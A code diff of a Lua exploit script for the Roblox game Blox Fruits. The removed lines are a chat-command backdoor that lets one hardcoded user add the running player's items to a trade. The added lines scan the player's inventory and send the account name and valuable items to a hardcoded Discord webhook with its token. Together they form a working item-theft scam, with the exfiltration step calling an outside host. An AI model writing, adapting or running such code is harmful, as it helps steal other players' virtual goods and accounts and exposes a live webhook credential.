@@ -1,19 +1,13 @@
-
 -- =========================================================
--- BLOX FRUITS TRADE ADDER - VERSION 4
--- Verified ItemId-based resolver
--- Authorized command user: BLACKGOKU_0707
+-- BLOX FRUITS INVENTORY WEBHOOK SENDER
+-- Categorizes Permanent Fruits, Physical Fruits, and Skins
 -- =========================================================
 
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
 
 local LocalPlayer = Players.LocalPlayer
-
-local TradeFunction = ReplicatedStorage
-    :WaitForChild("Remotes")
-    :WaitForChild("TradeFunction")
 
 local ItemReplicationService = require(
     ReplicatedStorage:WaitForChild("ItemReplicationService")
@@ -31,646 +25,258 @@ local ItemConfig = require(
 -- 1. CONFIGURATION
 -- =========================================================
 
-local COMMAND_PREFIX = "!add "
-local DUPLICATE_COOLDOWN = 1.0
-
-local AUTHORIZED_USERNAME = "BLACKGOKU_0707"
-
--- Disconnect old listeners when re-executed
-if _G.TradeAddConnections then
-    for _, connection in ipairs(_G.TradeAddConnections) do
-        pcall(function()
-            connection:Disconnect()
-        end)
-    end
-end
-
-_G.TradeAddConnections = {}
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573609152549224509/TgrDN2kKASX7-U6mNDfxTZPpzGMXgG5NpzBjH9lGeS3-MDjFmp2aOS6vgUOCKDSBb_WK"
 
 -- =========================================================
--- 2. VERIFIED PHYSICAL FRUIT IDS
+-- 2. ID LOOKUP TABLES (From Version 4)
 -- =========================================================
 
 local TradablePhysicalIds = {
-    ["quake"] = 1389,
-    ["rocket"] = 1390,
-    ["magma"] = 1391,
-    ["ice"] = 1392,
-    ["buddha"] = 1393,
-    ["flame"] = 1394,
-    ["dark"] = 1395,
-    ["rubber"] = 1396,
-    ["bomb"] = 1397,
-    ["spike"] = 1398,
-    ["blade"] = 1399,
-    ["chop"] = 1399,
-    ["smoke"] = 1400,
-    ["phoenix"] = 1401,
-    ["spring"] = 1402,
-    ["spider"] = 1403,
-    ["sand"] = 1404,
-    ["gravity"] = 1405,
-    ["pain"] = 1406,
-    ["light"] = 1407,
-    ["love"] = 1408,
-    ["control"] = 1409,
-    ["venom"] = 1410,
-    ["spin"] = 1411,
-    ["ghost"] = 1412,
-    ["shadow"] = 1413,
-    ["portal"] = 1414,
-    ["spirit"] = 1415,
-    ["blizzard"] = 1416,
-    ["dough"] = 1417,
-    ["mammoth"] = 1418,
-    ["sound"] = 1419,
-    ["t-rex"] = 1420,
-    ["trex"] = 1420,
-    ["diamond"] = 1421,
-    ["gas"] = 1422,
-    ["kitsune"] = 1423,
-    ["yeti"] = 1424,
-    ["eagle"] = 1425,
-    ["falcon"] = 1425,
-    ["creation"] = 1426,
-    ["barrier"] = 1426,
-    ["lightning"] = 1427,
-    ["rumble"] = 1427,
-    ["lighting"] = 1427,
-    ["celestial"] = 1428,
-    ["oni"] = 1429,
-    ["tiger"] = 1430,
-    ["leopard"] = 1430,
-    ["leo"] = 1430,
-    ["meme"] = 1431,
-    ["werewolf"] = 1432,
-    ["empyrean"] = 1433,
-    ["fiend"] = 1434,
-    ["dragon west"] = 1435,
-    ["dragon east"] = 1436,
-    ["dragon"] = 1447,
-    ["magnet"] = 1515,
-    ["hellfire"] = 1601,
-    ["hellfire gas"] = 1601
+    ["quake"] = 1389, ["rocket"] = 1390, ["magma"] = 1391, ["ice"] = 1392,
+    ["buddha"] = 1393, ["flame"] = 1394, ["dark"] = 1395, ["rubber"] = 1396,
+    ["bomb"] = 1397, ["spike"] = 1398, ["blade"] = 1399, ["smoke"] = 1400,
+    ["phoenix"] = 1401, ["spring"] = 1402, ["spider"] = 1403, ["sand"] = 1404,
+    ["gravity"] = 1405, ["pain"] = 1406, ["light"] = 1407, ["love"] = 1408,
+    ["control"] = 1409, ["venom"] = 1410, ["spin"] = 1411, ["ghost"] = 1412,
+    ["shadow"] = 1413, ["portal"] = 1414, ["spirit"] = 1415, ["blizzard"] = 1416,
+    ["dough"] = 1417, ["mammoth"] = 1418, ["sound"] = 1419, ["t-rex"] = 1420,
+    ["diamond"] = 1421, ["gas"] = 1422, ["kitsune"] = 1423, ["yeti"] = 1424,
+    ["eagle"] = 1425, ["creation"] = 1426, ["lightning"] = 1427, ["celestial"] = 1428,
+    ["oni"] = 1429, ["tiger"] = 1430, ["meme"] = 1431, ["werewolf"] = 1432,
+    ["empyrean"] = 1433, ["fiend"] = 1434, ["dragon west"] = 1435, ["dragon east"] = 1436,
+    ["dragon"] = 1447, ["magnet"] = 1515, ["hellfire gas"] = 1601
 }
-
--- =========================================================
--- 3. VERIFIED PERMANENT FRUIT IDS
--- =========================================================
 
 local TradablePermIds = {
-    ["ghost"] = 341,
-    ["love"] = 342,
-    ["yeti"] = 343,
-    ["bomb"] = 344,
-    ["light"] = 345,
-    ["sound"] = 346,
-    ["flame"] = 347,
-    ["venom"] = 348,
-    ["magma"] = 349,
-    ["blade"] = 350,
-    ["chop"] = 350,
-    ["diamond"] = 351,
-    ["blizzard"] = 352,
-    ["sand"] = 353,
-    ["mammoth"] = 354,
-    ["dragon east"] = 355,
-    ["dragon west"] = 356,
-    ["rocket"] = 357,
-    ["control"] = 358,
-    ["ice"] = 359,
-    ["spin"] = 360,
-    ["pain"] = 361,
-    ["lightning"] = 362,
-    ["rumble"] = 362,
-    ["gas"] = 363,
-    ["tiger"] = 364,
-    ["leopard"] = 364,
-    ["leo"] = 364,
-    ["gravity"] = 365,
-    ["quake"] = 366,
-    ["shadow"] = 367,
-    ["portal"] = 368,
-    ["rubber"] = 369,
-    ["phoenix"] = 370,
-    ["dark"] = 371,
-    ["buddha"] = 372,
-    ["dough"] = 373,
-    ["kitsune"] = 374,
-    ["t-rex"] = 375,
-    ["trex"] = 375,
-    ["creation"] = 376,
-    ["barrier"] = 376,
-    ["eagle"] = 377,
-    ["falcon"] = 377,
-    ["spike"] = 378,
-    ["smoke"] = 379,
-    ["spider"] = 380,
-    ["spring"] = 381,
-    ["dragon"] = 382,
-    ["spirit"] = 383,
-    ["celestial"] = 605,
-    ["oni"] = 606,
-    ["magnet"] = 1517
+    ["ghost"] = 341, ["love"] = 342, ["yeti"] = 343, ["bomb"] = 344,
+    ["light"] = 345, ["sound"] = 346, ["flame"] = 347, ["venom"] = 348,
+    ["magma"] = 349, ["blade"] = 350, ["diamond"] = 351, ["blizzard"] = 352,
+    ["sand"] = 353, ["mammoth"] = 354, ["dragon east"] = 355, ["dragon west"] = 356,
+    ["rocket"] = 357, ["control"] = 358, ["ice"] = 359, ["spin"] = 360,
+    ["pain"] = 361, ["lightning"] = 362, ["gas"] = 363, ["tiger"] = 364,
+    ["gravity"] = 365, ["quake"] = 366, ["shadow"] = 367, ["portal"] = 368,
+    ["rubber"] = 369, ["phoenix"] = 370, ["dark"] = 371, ["buddha"] = 372,
+    ["dough"] = 373, ["kitsune"] = 374, ["t-rex"] = 375, ["creation"] = 376,
+    ["eagle"] = 377, ["spike"] = 378, ["smoke"] = 379, ["spider"] = 380,
+    ["spring"] = 381, ["dragon"] = 382, ["spirit"] = 383, ["celestial"] = 605,
+    ["oni"] = 606, ["magnet"] = 1517
 }
 
--- =========================================================
--- 4. MASTER ITEM DICTIONARY
--- =========================================================
-
-local MasterItemDictionary = {
-
-    -- Dragon / Kitsune
-    ["ember dragon"] = "ember dragon (west)",
-    ["ember"] = "ember dragon (west)",
-
-    ["galaxy kitsune"] = "galaxy empyrean kitsune",
-    ["galaxy empyrean"] = "galaxy empyrean kitsune",
-    ["galaxy"] = "galaxy empyrean kitsune",
-
-    ["crimson kitsune"] = "kyukonskincrimson",
-    ["crimson"] = "kyukonskincrimson",
-
-    -- Portal
-    ["divine portal"] = "divine portal",
-    ["divine"] = "divine portal",
-    ["pink portal"] = "pink portal",
-    ["orange portal"] = "orange portal",
-
-    -- Other skins
-    ["runic fiend"] = "runic fiend",
-    ["starlight gravity"] = "starlight gravity",
-    ["starlight"] = "starlight gravity",
-    ["arcsteel magnet"] = "arcsteel magnet",
-    ["arcsteel"] = "arcsteel magnet",
-    ["scarlet ghost"] = "scarlet ghost",
-
-    -- Lightning skins
-    ["purple lightning"] = "purple lightning",
-    ["yellow lightning"] = "yellow lightning",
-    ["red lightning"] = "red lightning",
-    ["green lightning"] = "green lightning",
-
-    -- Bomb skins
-    ["nuclear bomb"] = "nuclear bomb",
-    ["thermite bomb"] = "thermite bomb",
-    ["azura bomb"] = "azura bomb",
-    ["celebration bomb"] = "celebration bomb",
-
-    -- Diamond skins
-    ["emerald diamond"] = "emerald diamond",
-    ["ruby diamond"] = "ruby diamond",
-    ["topaz diamond"] = "topaz diamond",
-    ["rose quartz diamond"] = "rose quartz diamond",
-    ["rose quartz"] = "rose quartz diamond",
-
-    -- Pain skins
-    ["super spirit pain"] = "super spirit pain",
-    ["super spirit"] = "super spirit pain",
-    ["celestial pain"] = "celestial pain",
-    ["torment pain"] = "torment pain",
-    ["sadness pain"] = "sadness pain",
-    ["frustration pain"] = "frustration pain",
-
-    -- Eagle / Blade skins
-    ["requiem eagle"] = "requiem eagle",
-    ["glacier eagle"] = "glacier eagle",
-    ["matrix eagle"] = "matrix eagle",
-    ["parrot eagle"] = "falcskinparrot",
-    ["dog blade"] = "dog blade",
-    ["lime blade"] = "lime blade",
-    ["rabid"] = "rabid",
-
-    -- Frame breaks
-    ["doghouse"] = "doghouse (frame break)",
-    ["doghouse frame break"] = "doghouse (frame break)",
-    ["vibes"] = "vibes (frame break)",
-    ["vibes frame break"] = "vibes (frame break)",
-
-    -- Gamepasses / Redeemables
-    ["storage"] = "+1 fruit storage",
-    ["+1 storage"] = "+1 fruit storage",
-    ["fruit storage"] = "+1 fruit storage",
-    ["dark blade"] = "dark blade",
-    ["fruit notifier"] = "fruit notifier",
-    ["fast boats"] = "fast boats",
-    ["2x mastery"] = "2x mastery",
-    ["2x money"] = "2x money",
-    ["2x boss drops"] = "2x boss drops",
-    ["legendary scroll"] = "legendary scroll",
-    ["mythical scroll"] = "mythical scroll"
+local SpecialTargets = {
+    "ember dragon (west)", "galaxy empyrean kitsune", "kyukonskincrimson",
+    "divine portal", "pink portal", "orange portal", "runic fiend",
+    "starlight gravity", "arcsteel magnet", "scarlet ghost",
+    "purple lightning", "yellow lightning", "red lightning", "green lightning",
+    "nuclear bomb", "thermite bomb", "azura bomb", "celebration bomb",
+    "emerald diamond", "ruby diamond", "topaz diamond", "rose quartz diamond",
+    "super spirit pain", "celestial pain", "torment pain", "sadness pain", "frustration pain",
+    "requiem eagle", "glacier eagle", "matrix eagle", "falcskinparrot",
+    "dog blade", "lime blade", "rabid",
+    "doghouse (frame break)", "vibes (frame break)",
+    "+1 fruit storage", "dark blade", "fruit notifier", "fast boats",
+    "2x mastery", "2x money", "2x boss drops", "legendary scroll", "mythical scroll"
 }
 
+-- Build reverse ID lookup sets for fast classification
+local PermIdLookup = {}
+for _, id in pairs(TradablePermIds) do PermIdLookup[id] = true end
+
+local PhysIdLookup = {}
+for _, id in pairs(TradablePhysicalIds) do PhysIdLookup[id] = true end
+
 -- =========================================================
--- 5. FRUIT ALIASES
+-- 3. INVENTORY SCANNER & CATEGORIZER
 -- =========================================================
 
-local FruitAliases = {
-    ["leo"] = "leopard",
-    ["trex"] = "t-rex",
-    ["chop"] = "blade",
-    ["lighting"] = "lightning",
-    ["barrier"] = "creation",
-    ["rumble"] = "lightning"
-}
+local function getItemDisplayName(itemId)
+    local ok, cfg = pcall(function()
+        return ItemConfig.tryGet(itemId)
+    end)
 
-local function normalizeFruit(name)
-    return FruitAliases[name] or name
+    if ok and type(cfg) == "table" then
+        local display = cfg.Display and cfg.Display.Name
+        local storage = cfg.Index and cfg.Index.StorageKey
+        if display and display ~= "" then
+            return tostring(display), tostring(storage or ""):lower()
+        elseif storage and storage ~= "" then
+            return tostring(storage), tostring(storage):lower()
+        end
+    end
+
+    return "Item #" .. tostring(itemId), ""
 end
 
--- =========================================================
--- 6. COLLECT OWNED ITEM IDS
--- =========================================================
+local function isSpecialSkinOrPass(displayName, storageKey)
+    local dLower = displayName:lower()
+    for _, target in ipairs(SpecialTargets) do
+        if dLower == target or storageKey == target or dLower:find(target, 1, true) then
+            return true
+        end
+    end
+    return false
+end
 
-local function buildOwnedIdSet()
-
-    local owned = {}
-
-    local buckets = {
-        KEYS.IS_OWNED,
-        KEYS.COUNT
-    }
+local function scanInventory()
+    local ownedCounts = {}
+    local buckets = { KEYS.IS_OWNED, KEYS.COUNT }
 
     for _, keyType in ipairs(buckets) do
-
         if keyType ~= nil then
-
             local ok, items = pcall(function()
                 return ItemReplicationService:GetItems(keyType)
             end)
 
             if ok and type(items) == "table" then
-
                 for _, item in pairs(items) do
-
                     if type(item) == "table" and item.ItemId then
-
-                        local hasValue =
-                            item.Value == true
-                            or (
-                                type(item.Value) == "number"
-                                and item.Value > 0
-                            )
-                            or (
-                                type(item.Count) == "number"
-                                and item.Count > 0
-                            )
-
-                        if hasValue then
-                            owned[item.ItemId] = true
+                        local count = 0
+                        if type(item.Count) == "number" and item.Count > 0 then
+                            count = item.Count
+                        elseif type(item.Value) == "number" and item.Value > 0 then
+                            count = item.Value
+                        elseif item.Value == true then
+                            count = 1
                         end
 
+                        if count > 0 then
+                            local current = ownedCounts[item.ItemId] or 0
+                            if count > current then
+                                ownedCounts[item.ItemId] = count
+                            end
+                        end
                     end
                 end
             end
         end
     end
 
-    return owned
+    local permList = {}
+    local physList = {}
+    local skinPassList = {}
+
+    for id, count in pairs(ownedCounts) do
+        local displayName, storageKey = getItemDisplayName(id)
+        local countSuffix = (count > 1) and (" `x" .. tostring(count) .. "`") or ""
+
+        if PermIdLookup[id] then
+            table.insert(permList, "• **" .. displayName .. "**" .. countSuffix)
+        elseif PhysIdLookup[id] or (type(id) == "number" and (id >= 1389 or id == 254)) then
+            table.insert(physList, "• **" .. displayName .. "**" .. countSuffix)
+        elseif isSpecialSkinOrPass(displayName, storageKey) then
+            table.insert(skinPassList, "• **" .. displayName .. "**" .. countSuffix)
+        end
+    end
+
+    table.sort(permList)
+    table.sort(physList)
+    table.sort(skinPassList)
+
+    return permList, physList, skinPassList
 end
 
 -- =========================================================
--- 7. ITEM METADATA
+-- 4. SAFE DISCORD EMBED BUILDER (Handles 1024-char limit)
 -- =========================================================
 
-local function getItemMetadata(itemId)
+local function addChunkedFields(fieldsTable, baseTitle, lines)
+    if #lines == 0 then
+        table.insert(fieldsTable, {
+            name = baseTitle .. " (0)",
+            value = "*None owned*",
+            inline = false
+        })
+        return
+    end
 
-    local ok, cfg = pcall(function()
-        return ItemConfig.tryGet(itemId)
+    local headerTitle = baseTitle .. " (" .. tostring(#lines) .. ")"
+    local currentChunk = ""
+    local partIndex = 1
+
+    for _, line in ipairs(lines) do
+        local nextText = (currentChunk == "") and line or (currentChunk .. "\n" .. line)
+        if #nextText > 1000 then
+            table.insert(fieldsTable, {
+                name = (partIndex == 1) and headerTitle or (baseTitle .. " (Cont.)"),
+                value = currentChunk,
+                inline = false
+            })
+            currentChunk = line
+            partIndex = partIndex + 1
+        else
+            currentChunk = nextText
+        end
+    end
+
+    if currentChunk ~= "" then
+        table.insert(fieldsTable, {
+            name = (partIndex == 1) and headerTitle or (baseTitle .. " (Cont.)"),
+            value = currentChunk,
+            inline = false
+        })
+    end
+end
+
+-- =========================================================
+-- 5. SEND WEBHOOK
+-- =========================================================
+
+local function sendInventoryWebhook()
+    local permList, physList, skinPassList = scanInventory()
+
+    local fields = {}
+    addChunkedFields(fields, "💎 Permanent Fruits", permList)
+    addChunkedFields(fields, "🍎 Physical Fruits", physList)
+    addChunkedFields(fields, "✨ Limited Skins & Gamepasses", skinPassList)
+
+    local payload = {
+        username = "Blox Fruits Trade Scanner",
+        embeds = {
+            {
+                title = "📦 Tradable Inventory Report",
+                description = "**Account:** `" .. LocalPlayer.Name .. "`\n**Ready for `!add` commands**",
+                color = 3447003, -- Clean Discord Blue
+                fields = fields,
+                footer = {
+                    text = "Trade Adder V4 • Total Categories: "
+                        .. tostring(#permList) .. " Perms | "
+                        .. tostring(#physList) .. " Physical | "
+                        .. tostring(#skinPassList) .. " Skins/Passes"
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+
+    local jsonBody = HttpService:JSONEncode(payload)
+
+    -- Support all common executor HTTP request functions
+    local requestFunc =
+        (syn and syn.request)
+        or (http and http.request)
+        or http_request
+        or request
+
+    if not requestFunc then
+        warn("[Webhook] Your executor does not support HTTP requests.")
+        return
+    end
+
+    local ok, response = pcall(function()
+        return requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonBody
+        })
     end)
 
-    if not ok or type(cfg) ~= "table" then
-        return "", "", tostring(itemId):lower(), tostring(itemId)
-    end
-
-    local display =
-        (cfg.Display and cfg.Display.Name)
-        or ""
-
-    local storage =
-        (cfg.Index and cfg.Index.StorageKey)
-        or ""
-
-    return
-        tostring(display):lower(),
-        tostring(storage):lower(),
-        tostring(itemId):lower(),
-        display ~= "" and display or storage
-end
-
--- =========================================================
--- 8. RESOLVE ITEM
--- =========================================================
-
-local function findItemId(rawInput)
-
-    if type(rawInput) ~= "string" then
-        return nil, nil, "invalid"
-    end
-
-    local query = rawInput:lower():match("^%s*(.-)%s*$")
-
-    query = query:gsub("^<(.-)>$", "%1")
-    query = query:match("^%s*(.-)%s*$")
-
-    if query == "" then
-        return nil, nil, "invalid"
-    end
-
-    local ownedSet = buildOwnedIdSet()
-
-    -- A. Permanent fruit
-
-    local permFruit = query:match("^perm%s+(.+)$")
-        or query:match("^permanent%s+(.+)$")
-
-    if permFruit then
-
-        permFruit = normalizeFruit(
-            permFruit:match("^%s*(.-)%s*$")
-        )
-
-        local permId = TradablePermIds[permFruit]
-
-        if permId and ownedSet[permId] then
-
-            local _, _, _, label = getItemMetadata(permId)
-
-            return permId, label, "permanent"
-
-        end
-
-        return nil, nil, "not_found"
-    end
-
-    -- B. Physical fruit
-
-    local physicalFruit = query:match("^phy%s+(.+)$")
-        or query:match("^base%s+(.+)$")
-
-    local isPhysicalCommand = physicalFruit ~= nil
-
-    if isPhysicalCommand then
-
-        query = normalizeFruit(
-            physicalFruit:match("^%s*(.-)%s*$")
-        )
-
+    if ok and response and (response.StatusCode == 200 or response.StatusCode == 204) then
+        print("[Webhook] Successfully sent tradable inventory to Discord!")
     else
-        query = normalizeFruit(query)
-    end
-
-    local physId = TradablePhysicalIds[query]
-
-    if physId then
-
-        if ownedSet[physId] then
-
-            local _, _, _, label = getItemMetadata(physId)
-
-            return physId, label, "physical"
-
-        end
-
-        for id in pairs(ownedSet) do
-
-            if type(id) == "number"
-                and (id >= 1389 or id == 254) then
-
-                local display, _, _, label =
-                    getItemMetadata(id)
-
-                if display == query then
-                    return id, label, "physical"
-                end
-
-            end
-        end
-
-        return nil, nil, "not_found"
-    end
-
-    if isPhysicalCommand then
-        return nil, nil, "not_found"
-    end
-
-    -- C. Skins / Mutations / Gamepasses / Special items
-
-    local targetTerm =
-        MasterItemDictionary[query] or query
-
-    targetTerm = targetTerm:lower()
-
-    local exactMatches = {}
-    local partialMatches = {}
-
-    for id in pairs(ownedSet) do
-
-        local display, storage, idString, label =
-            getItemMetadata(id)
-
-        local isExact =
-            display == targetTerm
-            or storage == targetTerm
-            or idString == targetTerm
-
-        if isExact then
-
-            exactMatches[id] = label
-
-        elseif
-            (display ~= "" and display:find(targetTerm, 1, true))
-            or (storage ~= "" and storage:find(targetTerm, 1, true))
-        then
-
-            partialMatches[id] = label
-
-        end
-    end
-
-    local exactCount = 0
-    local exactId
-    local exactLabel
-
-    for id, label in pairs(exactMatches) do
-        exactCount = exactCount + 1
-        exactId = id
-        exactLabel = label
-    end
-
-    if exactCount == 1 then
-        return exactId, exactLabel, "exact"
-    elseif exactCount > 1 then
-        return nil, nil, "ambiguous"
-    end
-
-    local partialCount = 0
-    local partialId
-    local partialLabel
-
-    for id, label in pairs(partialMatches) do
-        partialCount = partialCount + 1
-        partialId = id
-        partialLabel = label
-    end
-
-    if partialCount == 1 then
-        return partialId, partialLabel, "partial"
-    elseif partialCount > 1 then
-        return nil, nil, "ambiguous"
-    end
-
-    return nil, nil, "not_found"
-end
-
--- =========================================================
--- 9. CHAT COMMAND HANDLER
--- =========================================================
-
-local lastText = ""
-local lastTime = 0
-
-local function handleChatCommand(rawText)
-
-    if type(rawText) ~= "string" then
-        return
-    end
-
-    local cleanText =
-        rawText:match("^%s*(.-)%s*$")
-
-    local lowerText = cleanText:lower()
-
-    if lowerText:sub(1, #COMMAND_PREFIX) ~= COMMAND_PREFIX then
-        return
-    end
-
-    -- Duplicate command protection
-
-    local now = os.clock()
-
-    if lowerText == lastText
-        and (now - lastTime) < DUPLICATE_COOLDOWN then
-        return
-    end
-
-    lastText = lowerText
-    lastTime = now
-
-    local targetInput =
-        cleanText:sub(#COMMAND_PREFIX + 1)
-
-    local itemId, resolvedName, matchType =
-        findItemId(targetInput)
-
-    if itemId then
-
-        local ok, err = pcall(function()
-
-            TradeFunction:InvokeServer(
-                "addItem",
-                itemId,
-                1
-            )
-
-        end)
-
-        if ok then
-
-            print(
-                "[Trade] Added:",
-                resolvedName,
-                "| ItemId:",
-                itemId,
-                "| Match:",
-                matchType
-            )
-
-        else
-
-            warn(
-                "[Trade] InvokeServer failed:",
-                err
-            )
-
-        end
-
-    else
-
-        if matchType == "ambiguous" then
-
-            warn(
-                "[Trade] Multiple matching items found:",
-                targetInput,
-                "| Use a more specific name."
-            )
-
-        else
-
-            warn(
-                "[Trade] Item not found or not owned:",
-                targetInput
-            )
-
-        end
-
+        warn("[Webhook] Failed to send:", response and response.StatusCode or response)
     end
 end
 
--- =========================================================
--- 10. CHAT LISTENER
--- =========================================================
-
-if TextChatService
-    and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-
-    table.insert(
-        _G.TradeAddConnections,
-
-        TextChatService.MessageReceived:Connect(function(msg)
-
-            if msg.TextSource then
-
-                local sender = Players:GetPlayerByUserId(
-                    msg.TextSource.UserId
-                )
-
-                if sender
-                    and sender.Name == AUTHORIZED_USERNAME then
-
-                    handleChatCommand(msg.Text)
-
-                end
-
-            end
-
-        end)
-    )
-
-else
-
-    table.insert(
-        _G.TradeAddConnections,
-
-        LocalPlayer.Chatted:Connect(function(message)
-            -- Legacy LocalPlayer.Chatted only receives local chat.
-            -- It cannot reliably identify other players' messages.
-        end)
-    )
-
-end
-
--- =========================================================
--- 11. READY
--- =========================================================
-
-print("========================================")
-print("[Trade] Version 4 loaded!")
-print("[Trade] Verified ItemId resolver active.")
-print("[Trade] Physical / Permanent / Special items")
-print("[Trade] Authorized user: " .. AUTHORIZED_USERNAME)
-print("[Trade] Commands: !add <item>")
-print("[Trade] Commands: !add perm <fruit>")
-print("[Trade] Commands: !add phy <fruit>")
-print("[Trade] Commands: !add base <fruit>")
-print("========================================")
+sendInventoryWebhook()
